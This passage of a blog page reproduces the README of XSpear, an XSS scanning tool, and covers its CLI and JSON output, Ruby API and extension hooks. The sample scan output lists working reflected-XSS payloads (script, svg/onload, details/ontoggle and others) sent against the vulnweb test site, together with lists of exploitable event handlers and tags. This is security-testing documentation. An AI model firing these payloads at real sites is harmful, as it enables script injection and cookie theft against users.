quot;onKeyUp&quot;,&quot;onMediaComplete&quot;,&quot;onMouseOver&quot;,&quot;onMouseWheel&quot;,&quot;onMove&quot;,&quot;onMouseMove&quot;,&quot;onMouseOut&quot;,&quot;onOffline&quot;,&quot;onMoveStart&quot;,&quot;onMouseLeave&quot;,&quot;onMouseUp&quot;,&quot;onMoveEnd&quot;,&quot;onPropertyChange&quot;,&quot;onOnline&quot;,&quot;onPause&quot;,&quot;onPaste&quot;,&quot;onReadyStateChange&quot;,&quot;onRedo&quot;,&quot;onProgress&quot;,&quot;onPopState&quot;,&quot;onOutOfSync&quot;,&quot;onRepeat&quot;,&quot;onResume&quot;,&quot;onRowExit&quot;,&quot;onReset&quot;,&quot;onResizeEnd&quot;,&quot;onRowsEnter&quot;,&quot;onResizeStart&quot;,&quot;onReverse&quot;,&quot;onRowDelete&quot;,&quot;onRowInserted&quot;,&quot;onResize&quot;,&quot;onStop&quot;,&quot;onSeek&quot;,&quot;onSelect&quot;,&quot;onSubmit&quot;,&quot;onStorage&quot;,&quot;onStart&quot;,&quot;onScroll&quot;,&quot;onSelectionChange&quot;,&quot;onSyncRestored&quot;,&quot;onSelectStart&quot;,&quot;onUnload&quot;,&quot;ontouchstart&quot;,&quot;onbeforescriptexecute&quot;,&quot;onTimeError&quot;,&quot;onURLFlip&quot;,&quot;ontouchmove&quot;,&quot;ontouchend&quot;,&quot;onTrackChange&quot;,&quot;onUndo&quot;,&quot;onafterscriptexecute&quot;,&quot;onpointermove&quot;,&quot;onpointerleave&quot;,&quot;onpointerup&quot;,&quot;onpointerover&quot;,&quot;onpointerdown&quot;,&quot;onpointerenter&quot;,&quot;onloadstart&quot;,&quot;onloadend&quot;,&quot;onpointerout&quot;
+ + Available HTML Tag: &quot;script&quot;,&quot;img&quot;,&quot;embed&quot;,&quot;video&quot;,&quot;audio&quot;,&quot;meta&quot;,&quot;style&quot;,&quot;frame&quot;,&quot;iframe&quot;,&quot;svg&quot;,&quot;object&quot;,&quot;frameset&quot;,&quot;applet&quot;
+ + Available Useful Code: &quot;document.cookie&quot;,&quot;document.location&quot;,&quot;window.location&quot;
+
+&lt; Raw Query &gt;
+[0] http://testphp.vulnweb.com/listproducts.php?-
+..snip..
+[19] http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E&amp;zfdfasdf=124fffff
+[20] http://testphp.vulnweb.com/listproducts.php?cat=123%22&#39;%3E%3Cmarquee%20onstart=alert(45)%3E&amp;zfdfasdf=124fffff
+[21] http://testphp.vulnweb.com/listproducts.php?cat=123%22&#39;%3E%3Cdetails/open/ontoggle=%22alert(45)%22%3E&amp;zfdfasdf=124fffff
+[22] http://testphp.vulnweb.com/listproducts.php?cat=123%22&#39;%3E%3Caudio%20src%20onloadstart=alert(45)%3E&amp;zfdfasdf=124fffff
+[23] http://testphp.vulnweb.com/listproducts.php?cat=123&#39;%22%3E%3Csvg/onload=alert(45)%3E&amp;zfdfasdf=124fffff
+
+...snip...</code></pre><p><strong>to JSON</strong></p>
+<pre><code>$ xspear -u &quot;http://testphp.vulnweb.com/listproducts.php?cat=123&amp;zfdfasdf=124fffff&quot; -v 1 -o json
+{&quot;starttime&quot;:&quot;2019-08-14 23:58:12 +0900&quot;,&quot;endtime&quot;:&quot;2019-08-14 23:58:44 +0900&quot;,&quot;issue_count&quot;:24,&quot;issue_list&quot;:[{&quot;id&quot;:0,&quot;type&quot;:&quot;INFO&quot;,&quot;issue&quot;:&quot;STATIC ANALYSIS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;-&quot;,&quot;payload&quot;:&quot;&lt;original query&gt;&quot;,&quot;description&quot;:&quot;Found Server: nginx/1.4.1&quot;},{&quot;id&quot;:1,&quot;type&quot;:&quot;INFO&quot;,&quot;issue&quot;:&quot;STATIC ANALYSIS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;-&quot;,&quot;payload&quot;:&quot;&lt;original query&gt;&quot;,&quot;description&quot;:&quot;Not set HSTS&quot;},{&quot;id&quot;:2,&quot;type&quot;:&quot;INFO&quot;,&quot;issue&quot;:&quot;STATIC ANALYSIS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;-&quot;,&quot;payload&quot;:&quot;&lt;original query&gt;&quot;,&quot;description&quot;:&quot;Content-Type: text/html&quot;},{&quot;id&quot;:3,&quot;type&quot;:&quot;LOW&quot;,&quot;issue&quot;:&quot;STATIC ANALYSIS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;-&quot;,&quot;payload&quot;:&quot;&lt;original query&gt;&quot;,&quot;description&quot;:&quot;Not Set X-Frame-Options&quot;},{&quot;id&quot;:4,&quot;type&quot;:&quot;MIDUM&quot;,&quot;issue&quot;:&quot;STATIC ANALYSIS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;-&quot;,&quot;payload&quot;:&quot;&lt;original query&gt;&quot;,&quot;description&quot;:&quot;Not Set CSP&quot;},{&quot;id&quot;:5,&quot;type&quot;:&quot;INFO&quot;,&quot;issue&quot;:&quot;DYNAMIC ANALYSIS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;XsPeaR\&quot;&quot;,&quot;description&quot;:&quot;Found SQL Error Pattern&quot;},{&quot;id&quot;:6,&quot;type&quot;:&quot;INFO&quot;,&quot;issue&quot;:&quot;REFLECTED&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;rEfe6&quot;,&quot;description&quot;:&quot;reflected parameter&quot;},{&quot;id&quot;:7,&quot;type&quot;:&quot;INFO&quot;,&quot;issue&quot;:&quot;FILERD RULE&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;onhwul=64&quot;,&quot;description&quot;:&quot;not filtered event handler on{any} pattern&quot;},{&quot;id&quot;:8,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;script&gt;alert(45)&lt;/script&gt;&quot;,&quot;description&quot;:&quot;reflected XSS Code&quot;},{&quot;id&quot;:9,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;textarea autofocus onfocus=alert(45)&gt;&quot;,&quot;description&quot;:&quot;reflected onfocus XSS Code&quot;},{&quot;id&quot;:10,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;video/poster/onerror=alert(45)&gt;&quot;,&quot;description&quot;:&quot;reflected HTML5 XSS Code&quot;},{&quot;id&quot;:11,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;audio src onloadstart=alert(45)&gt;&quot;,&quot;description&quot;:&quot;reflected HTML5 XSS Code&quot;},{&quot;id&quot;:12,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;details/open/ontoggle=\&quot;alert`45`\&quot;&gt;&quot;,&quot;description&quot;:&quot;reflected HTML5 XSS Code&quot;},{&quot;id&quot;:13,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;select autofocus onfocus=alert(45)&gt;&quot;,&quot;description&quot;:&quot;reflected onfocus XSS Code&quot;},{&quot;id&quot;:14,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;marquee onstart=alert(45)&gt;&quot;,&quot;description&quot;:&quot;reflected HTML5 XSS Code&quot;},{&quot;id&quot;:15,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;input autofocus onfocus=alert(45)&gt;&quot;,&quot;description&quot;:&quot;reflected onfocus XSS Code&quot;},{&quot;id&quot;:16,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;\&quot;&gt;&lt;iframe/src=JavaScriPt:alert(45)&gt;&quot;,&quot;description&quot;:&quot;reflected XSS Code&quot;},{&quot;id&quot;:17,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;meter onmouseover=alert(45)&gt;0&lt;/meter&gt;&quot;,&quot;description&quot;:&quot;reflected HTML5 XSS Code&quot;},{&quot;id&quot;:18,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;keygen autofocus onfocus=alert(45)&gt;&quot;,&quot;description&quot;:&quot;reflected onfocus XSS Code&quot;},{&quot;id&quot;:19,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;audio src onloadstart=alert(45)&gt;&quot;,&quot;description&quot;:&quot;triggered &lt;audio src onloadstart=alert(45)&gt;&quot;},{&quot;id&quot;:20,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;marquee onstart=alert(45)&gt;&quot;,&quot;description&quot;:&quot;triggered &lt;marquee onstart=alert(45)&gt;&quot;},{&quot;id&quot;:21,&quot;type&quot;:&quot;HIGH&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;details/open/ontoggle=\&quot;alert(45)\&quot;&gt;&quot;,&quot;description&quot;:&quot;triggered &lt;details/open/ontoggle=\&quot;alert(45)\&quot;&gt;&quot;},{&quot;id&quot;:22,&quot;type&quot;:&quot;VULN&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&lt;script&gt;alert(45)&lt;/script&gt;&quot;,&quot;description&quot;:&quot;triggered &lt;script&gt;alert(45)&lt;/script&gt;&quot;},{&quot;id&quot;:23,&quot;type&quot;:&quot;VULN&quot;,&quot;issue&quot;:&quot;XSS&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;param&quot;:&quot;cat&quot;,&quot;payload&quot;:&quot;&#39;\&quot;&gt;&lt;svg/onload=alert(45)&gt;&quot;,&quot;description&quot;:&quot;triggered &lt;svg/onload=alert(45)&gt;&quot;}]}</code></pre><h2 id="Usage-on-ruby-code"><a href="#Usage-on-ruby-code" class="headerlink" title="Usage on ruby code"></a>Usage on ruby code</h2><pre><code class="ruby">require &#39;XSPear&#39;
+
+# Set options
+options = {}
+options[&#39;thread&#39;] = 30
+options[&#39;cookie&#39;] = &quot;data=123&quot;
+options[&#39;blind&#39;] = &quot;https://hahwul.xss.ht&quot;
+options[&#39;output&#39;] = json
+
+# Create XSpear object with url, options
+s = XspearScan.new &quot;https://www.hahwul.com?target_url&quot;, options
+
+# Scanning
+s.run
+result = s.report.to_json
+r = JSON.parse result</code></pre>
+<h2 id="Add-Scanning-Module"><a href="#Add-Scanning-Module" class="headerlink" title="Add Scanning Module"></a>Add Scanning Module</h2><p><strong>1) Add <code>makeQueryPattern</code></strong></p>
+<pre><code class="ruby">makeQueryPattern(&#39;type&#39;, &#39;query,&#39;, &#39;pattern&#39;, &#39;category&#39;, &quot;description&quot;, &quot;callback funcion&quot;)
+# type: f(ilterd?) r(eflected?) x(ss?)
+# category i(nfo) v(uln) l(ow) m(edium) h(igh) 
+
+# e.g 
+# makeQueryPattern(&#39;f&#39;, &#39;XsPeaR,&#39;, &#39;XsPeaR,&#39;, &#39;i&#39;, &quot;not filtered &quot;+&quot;,&quot;.blue, CallbackStringMatch)</code></pre>
+<p><strong>2) if other callback, write callback class override <code>ScanCallbackFunc</code></strong><br>e.g</p>
+<pre><code class="ruby">  class CallbackStringMatch &lt; ScanCallbackFunc
+    def run
+      if @response.body.include? @query
+        [true, &quot;reflected #{@query}&quot;]
+      else
+        [false, &quot;not reflected #{@query}&quot;]
+      end
+    end
+  end</code></pre>
+<p>Parent class(ScanCallbackFunc)</p>
+<pre><code class="ruby">class ScanCallbackFunc()
+    def initialize(url, method, query, response)
+      @url = url
+      @method = method
+      @query = query
+      @response = response
+      # self.run
+    end
+
+    def run
+      # override
+    end
+end</code></pre>
+<p>Common Callback Class</p>
+<ul>
+<li>CallbackXSSSelenium</li>
+<li>CallbackErrorPatternMatch</li>
+<li>CallbackCheckHeaders</li>
+<li>CallbackStringMatch</li>
+<li>CallbackNotAdded</li>
+<li>etc…</li>
+</ul>
+<h2 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h2><p>if nomal user</p>
+<pre><code>$ gem update XSpear</code></pre><p>if developers (soft)</p>
+<pre><code>$ git pull -v</code></pre><p>if develpers (hard)</p>
+<pre><code>$ git reset --hard HEAD; git pull -v</code></pre><h2 id="RubyDoc"><a href="#RubyDoc" class="headerlink" title="RubyDoc"></a>RubyDoc</h2><p><a href="https://www.rubydoc.info/gems/XSpear/" target="_blank" rel="noopener">https://www.rubydoc.info/gems/XSpear/</a></p>
+<h2 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h2><p>After checking out the repo, run <code>bin/setup</code> to install dependencies. Then, run <code>rake spec</code> to run the tests. You can also run <code>bin/console</code> for an interactive prompt that will allow you to experiment.</p>
+<p>To install this gem onto your local machine, run <code>bundle exec rake install</code>. To release a new version, update the version number in <code>version.rb</code>, and then run <code>bundle exec rake release</code>, which will create a git tag for the version, push git commits and tags, and push the <code>.gem</code> file to <a href="https://rubygems.org" target="_blank" rel="noopener">rubygems.org</a>.</p>
+<h2 id="Contributing"><a href="#Contributing" class="headerlink" title="Contributing"></a>Contributing</h2><p>Bug reports and pull requests are welcome on GitHub at <a href="https://github.com/hahwul/XSpear" target="_blank" rel="noopener">https://github.com/hahwul/XSpear</a>. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the <a href="http://contributor-covenant.org" target="_blank" rel="noopener">Contributor Covenant</a> code of conduct.</p>
+<h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>I like coffee! I’m a coffee addict.<br><br><a href="https://www.paypal.me/hahwul" target="_blank" rel="noopener"><img src="https://www.paypalobjects.com/digitalassets/c/website/logo/full-text/pp_fc_hl.svg" height="50px"></a><br><a href="https://www.buymeacoffee.com/hahwul" target="_blank" rel="noopener"><img src="https://cdn.buymeacoffee.com/buttons/default-black.png" alt="Buy Me A Coffee" height="50px"></a></p>
+<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>The gem is available as open source under the terms of the <a href="https://opensource.org/licenses/MIT" target="_blank" rel="noopener">MIT License</a>.</p>
+<h2 id="Code-of-Conduct"><a href="#Code-of-Conduct" class="headerlink" title="Code of Conduct"></a>Code of Conduct</h2><p>Everyone interacting in the XSpear project’s codebases, issue trackers, chat rooms and mailing lists is expected to follow the <a href="https://github.com/[USERNAME]/XSpear/blob/master/CODE_OF_CONDUCT.md" target="_blank" rel="noopener">code of conduct</a>.</p>
+<h2 id="ScreenShot"><a href="#ScreenShot" class="headerlink" title="ScreenShot"></a>ScreenShot</h2><p>&lt; Scanning Image&gt;<br><img src="https://user-images.githubusercontent.com/13212227/71557939-c8c17400-2a90-11ea-9307-6cd9b9736afc.png" width="100%"><br>&lt; CLI-Report 1 &gt;<br><img src="https://user-images.githubusercontent.com/13212227/71557940-c8c17400-2a90-11ea-90f4-589366f8fba8.png" width="100%"><br>&lt; CLI-Report 2 &gt;<br><img src="https://user-images.githubusercontent.com/13212227/71557941-c8c17400-2a90-11ea-9cfe-90e9b5d51c34.png" width="100%"><br>&lt; JSON Report &gt;<br><img src="https://user-images.githubusercontent.com/13212227/63032411-b8996580-bef0-11e9-8aee-0b80fe87f50d.png" width="100%"><br>&lt; HTML Report &gt;<br><img src="https://user-images.githubusercontent.com/13212227/74363820-b1570400-4e0e-11ea-9ce5-c78319a9d81c.png" width="100%"></p>
+<h2 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h2><p><a href="https://asciinema.org/a/290126" target="_blank" rel="noopener"><img src="https://asciinema.org/a/290126.svg" alt="asciicast"></a></p>
+<h1 id="Repo"><a href="#Repo" class="headerlink" title="Repo"></a><code>Repo</code></h1><blockquote>
+<p><em>github repo : <a href="https://github.com/hahwul/XSpear" target="_blank" rel="noopener">https://github.com/hahwul/XSpear</a></em></p>
+</blockquote>
+<h1 id="Teching-Video"><a href="#Teching-Video" class="headerlink" title="Teching Video"></a><code>Teching Video</code></h1><blockquote>
+<p><em>How to Scan a Web Application for XSS Vulnerability : <a href="https://youtu.be/ziFPLm__taw" target="_blank" rel="noopener">https://youtu.be/ziFPLm__taw</a></em></p>
+</blockquote>
+<h1 id="Frequent-Issues"><a href="#Frequent-Issues" class="headerlink" title="Frequent Issues"></a><code>Frequent Issues</code></h1><blockquote>
+<p>. . .</p>
+</blockquote>
+
+  
+  <p class="copyright"><strong>Links: <a href="http://yoursite.com/2020/06/10/XSPear-Powerfull-XSS-Scanning-and-Parameter-analysis-tool-gem/">http://yoursite.com/2020/06/10/XSPear-Powerfull-XSS-Scanning-and-Parameter-analysis-tool-gem/</a></strong></p>  
+</article>
+
+<div id="comment">
+    
+</div>
+        </div>
+      </div>
+    </div>
+    <div id="footer">
+      <div class="wrapper">
+        <div class="container">
+          
+<button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">TOP</button>
+<footer>
+    <div>
+        <p>
+            © 2022 <a href="http://yoursite.com">John Doe</a>.
+            Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>.
+            Theme <a href="https://github.com/songquanpeng/hexo-theme-lightx" target="_blank" rel="noopener">lightx</a>.
+            
+        </p>
+    </div>
+</footer>
+
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  </body>
+</html>
